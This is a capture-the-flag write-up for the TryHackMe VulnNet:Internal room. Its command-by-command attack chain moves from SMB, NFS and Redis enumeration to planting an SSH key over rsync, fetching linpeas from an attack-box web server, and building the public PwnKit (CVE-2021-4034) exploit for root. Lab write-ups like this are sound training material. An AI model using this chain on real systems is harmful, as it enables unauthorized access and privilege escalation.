## Link to tryhackme room
[VulnNet:Internal](https://tryhackme.com/room/vulnnetinternal)

## Save target IP to a variable (NOTE: Your IP will be different)

`export target="10.10.174.8"`

## Scan all ports  

```
sudo nmap -Pn -p- -sS -T4 ${targt}`                                                                                                                                                             
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-19 13:30 EST
Nmap scan report for 10.10.174.8
Host is up (0.090s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
111/tcp   open     rpcbind
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
873/tcp   open     rsync
2049/tcp  open     nfs
6379/tcp  open     redis
9090/tcp  filtered zeus-admin
35229/tcp open     unknown
41491/tcp open     unknown
44623/tcp open     unknown
51717/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 56.17 seconds
```

## Enumerate the open ports

```
nmap -Pn -p22,111,139,445,873,2049,6379,9090,35229,41491,44623,51717 -sC -sV ${target} 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-19 13:33 EST
Nmap scan report for 10.10.174.8
Host is up (0.094s latency).

PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
111/tcp   open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35229/tcp   mountd
|   100005  1,2,3      44440/udp   mountd
|   100005  1,2,3      52507/udp6  mountd
|   100005  1,2,3      52745/tcp6  mountd
|   100021  1,3,4      42545/tcp6  nlockmgr
|   100021  1,3,4      44623/tcp   nlockmgr
|   100021  1,3,4      52277/udp6  nlockmgr
|   100021  1,3,4      58266/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp   open     rsync       (protocol version 31)
2049/tcp  open     nfs_acl     3 (RPC #100227)
6379/tcp  open     redis       Redis key-value store
9090/tcp  filtered zeus-admin
35229/tcp open     mountd      1-3 (RPC #100005)
41491/tcp open     mountd      1-3 (RPC #100005)
44623/tcp open     nlockmgr    1-4 (RPC #100021)
51717/tcp open     mountd      1-3 (RPC #100005)
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2022-11-19T19:37:47+01:00
|_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-11-19T18:37:47
|_  start_date: N/A
|_clock-skew: mean: -16m20s, deviation: 34m38s, median: 3m38s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.22 seconds
```

## Exploring Samba

Running `enum4linux` against the target box, we find three 3 shares, but only one is accessible -- `shares`:  

```
[+] Attempting to map shares on 10.10.174.8                                                                                                                                                                    
                                                                                                                                                                                                               
//10.10.174.8/print$    Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                                              
//10.10.174.8/shares    Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                                                                                                                                                                                 
                                                                                                                                                                                                               
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                                                                     
//10.10.174.8/IPC$      Mapping: N/A Listing: N/A Writing: N/A
``` 

Let's try to connect to that share.  If we can successfully connect to the share, then we'll download interesting files:  


```                                                                                                                                                                                                           
smbclient --no-pass //${target}/shares
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3275508 blocks available
smb: \> cd data
smb: \data\> ls
  .                                   D        0  Tue Feb  2 04:27:33 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  data.txt                            N       48  Tue Feb  2 04:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3275508 blocks available
smb: \data\> get data.txt
getting file \data\data.txt of size 48 as data.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \data\> get business-req.txt
getting file \data\business-req.txt of size 190 as business-req.txt (0.5 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \data\> cd ..
smb: \> ls
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3275508 blocks available
smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 06:45:10 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  services.txt                        N       38  Sat Feb  6 06:45:09 2021

                11309648 blocks of size 1024. 3275508 blocks available
smb: \temp\> get services.txt
getting file \temp\services.txt of size 38 as services.txt (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \temp\> exit
```
Great, we've got our first flag!  But it really didn't help us gain access to the box. So let's now explore the nfs service( tcp port 2049).  
                                                                                                                                                                                                               

## Explore NFS

```
showmount -e ${target}                                    
Export list for 10.10.174.8:
/opt/conf *
```
Looks like anyone can mount the `/opt/conf` directory -- so let's mount it and explore:  

```
sudo mount ${target}:/opt/conf /mnt          
cd /mnt           
ls                                                                                                                                                                                                    
hp/  init/  opt/  profile.d/  redis/  vim/  wildmidi/
```

I checked every directory, but the only one with vaulable information was the redis directory:  

```
cd redis         
ls
redis.conf
grep pass redis.conf                                                                                                                                                                                 130 ⨯
# 2) No password is configured.
# If the master is password protected (using the "requirepass" configuration
# masterauth <master-password>
requirepass "REDACTED"
# resync is enough, just passing the portion of data the slave missed while
# 150k passwords per second against a good box. This means that you should
# use a very strong password otherwise it will be very easy to break.
# requirepass foobared
```

Awesome, we now have the password to the redis server.  

## Explore Redis

Connect to the redis server and authenticate with the password found in the nfs server:  
```
redis-cli -h ${target} 
10.10.174.8:6379> AUTH REDACTED
OK
10.10.174.8:6379>
```
Exploring the keyspace, we see there is a db0.  Let's select it and exlpore the keys:  

```
10.10.174.8:6379> info keyspace
# Keyspace
db0:keys=5,expires=0,avg_ttl=0
10.10.174.8:6379> select 0
OK
10.10.174.8:6379> keys *
1) "int"
2) "authlist"
3) "internal flag"
4) "marketlist"
5) "tmp"
10.10.174.8:6379> 
````
Exploring the keys, we find our second flag and the credentials to connect to the rsync service:  

### Second Flag

```
10.10.174.8:6379> get "internal flag"
"REDACTED"
10.10.174.8:6379> 
```
#### Credentials for rsync service:  

There are four possible values, but only one will decode probably to receive the credentials:  

```
10.10.174.8:6379> get authlist
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.10.174.8:6379> type authlist
list
10.10.174.8:6379> lrange authlist 0 -1
1) "REDACTED"
2) "REDACTED"
3) "REDACTED"
4) "REDACTED"
10.10.174.8:6379> 
```



## Explore Rsync

Before we can rsync data, let's find out what directory share(s) --also known as modules-- are available.  You can use nmap or metasploit to get the list of modules:  

### Nmap version

```
nmap -sV --script "rsync-list-modules" -p  873 ${target}
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-19 14:21 EST
Nmap scan report for 10.10.174.8
Host is up (0.090s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|_  files               Necessary home interaction
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
```

### Metasploit version  

```
msf6 > search rsync

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  auxiliary/scanner/rsync/modules_list                   normal  No     List Rsync Modules
   1  post/multi/gather/rsyncd_creds                         normal  No     UNIX Gather RSYNC Credentials


Interact with a module by name or index. For example info 1, use 1 or use post/multi/gather/rsyncd_creds

msf6 > use 0
msf6 auxiliary(scanner/rsync/modules_list) > show options

Module options (auxiliary/scanner/rsync/modules_list):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   RHOSTS                                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                873              yes       The target port (TCP)
   TEST_AUTHENTICATION  true             yes       Test if the rsync module requires authentication
   THREADS              1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/rsync/modules_list) > set rhosts 10.10.174.8
rhosts => 10.10.174.8
msf6 auxiliary(scanner/rsync/modules_list) > show options

Module options (auxiliary/scanner/rsync/modules_list):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   RHOSTS               10.10.174.8      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                873              yes       The target port (TCP)
   TEST_AUTHENTICATION  true             yes       Test if the rsync module requires authentication
   THREADS              1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/rsync/modules_list) > run
[+] 10.10.174.8:873       - 1 rsync modules found: files
[*] 10.10.174.8:873       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Let's connect to rsync and download all files and directories:  

```
rsync -av rsync://rsync-connect@${target}/files ./rsync_shred                                                                                                                                        139 ⨯
Password: 
receiving incremental file list
created directory ./rsync_shred
...
<REDCATED>
...
```                                                        

The data we downloaded is from a user's home directory.  We find our third flag looking through the files and directories, but nothing else of much worth. However, there is an empty `.ssh` directory. So let's create ssh keys, upload the ssh keys and attempt to login:  

```
ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/edward/.ssh/id_rsa): /home/edward/Documents/tryhackme/vulnnetinternal/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/edward/Documents/tryhackme/vulnnetinternal/id_rsa
Your public key has been saved in /home/edward/Documents/tryhackme/vulnnetinternal/id_rsa.pub
The key fingerprint is:
SHA256:l3D5K3+0fzkl6NM+E7WbW03XjLCTZDMEbajBWTuzThc edward@repoman
The key's randomart image is:
+---[RSA 3072]----+
|       . oo+.    |
|        + .+o    |
|        .o*.E    |
|        .o O B oo|
|        S = *...*|
|         + ..o+o+|
|          o..o +B|
|           oo *=o|
|            .+.==|
+----[SHA256]-----+
```

```
cat id_rsa.pub > authorized_keys
rsync -av authorized_keys rsync://rsync-connect@${target}/files/<username>/.ssh/
``` 

```
ssh -i id_rsa <username>@${target}                                                                                                                                                                 130 ⨯
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

<username>@vulnnet-internal:~$ pwd
/home/<username>
```

I looked around the system briefly and unless there are low hangging fruits, I prefer to use linpeas to quickly analyze the target.  I set up a quick python web server on my attack box, downloaded linpeas on the victim box.  

Attack box: `python3 -m http.server 8000`  

Victim box:  
```
<username>@vulnnet-internal:~$ cd /tmp
<username>@vulnnet-internal:/tmp$ wget http://10.9.0.28:8000/linpeas.sh
--2022-11-19 21:22:33--  http://10.9.0.28:8000/linpeas.sh
Connecting to 10.9.0.28:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776167 (758K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                          100%[==================================================================================================================>] 757.98K  1.24MB/s    in 0.6s    

2022-11-19 21:22:34 (1.24 MB/s) - ‘linpeas.sh’ saved [776167/776167]
<username>@vulnnet-internal:/tmp$ chmod +x linpeas.sh 
<username>@vulnnet-internal:/tmp$ ./linpeas.sh 
```

After combing through the output provided by linpeas, I settled on exploiting CVE-2021-4034 vulnerability, a.k.a. pwnkit:  

```
[+] [CVE-2021-4034] PwnKit                                                                                                                                                                                     

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

On my attack box, I downloaded the exploit and served it via the python web server.  I downloaded the exploit on the victim box, build it, ran it and we now have root and our final flag!:  

```
<username>@vulnnet-internal:/tmp$ wget -r http://10.9.0.28:8000/main
--2022-11-19 21:34:01--  http://10.9.0.28:8000/main
Connecting to 10.9.0.28:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/zip]
Saving to: ‘main’

main                                                    [ <=>                                                                                                               ]   6.31K  --.-KB/s    in 0.001s  

2022-11-19 15:29:02 (5.09 MB/s) - ‘main’ saved [6457]


<username>@vulnnet-internal:/tmp$ file main                    
main: Zip archive data, at least v1.0 to extract, compression method=store
<username>@vulnnet-internal:/tmp$ unzip main                   
Archive:  main
55d60e381ef90463ed35f47af44bf7e2fbc150d4
   creating: CVE-2021-4034-main/
  inflating: CVE-2021-4034-main/.gitignore  
  inflating: CVE-2021-4034-main/LICENSE  
  inflating: CVE-2021-4034-main/Makefile  
  inflating: CVE-2021-4034-main/README.md  
  inflating: CVE-2021-4034-main/cve-2021-4034.c  
  inflating: CVE-2021-4034-main/cve-2021-4034.sh  
   creating: CVE-2021-4034-main/dry-run/
  inflating: CVE-2021-4034-main/dry-run/Makefile  
  inflating: CVE-2021-4034-main/dry-run/dry-run-cve-2021-4034.c  
  inflating: CVE-2021-4034-main/dry-run/pwnkit-dry-run.c  
  inflating: CVE-2021-4034-main/pwnkit.c  

<username>@vulnnet-internal:/tmp$ cd CVE-2021-4034-main 
<username>@vulnnet-internal:/tmp/CVE-2021-4034-main$ make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /bin/true GCONV_PATH=./pwnkit.so:.
<username>@vulnnet-internal:/tmp/CVE-2021-4034-main$ ./cve-2021-4034 
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
<REDACTED>
# 
```
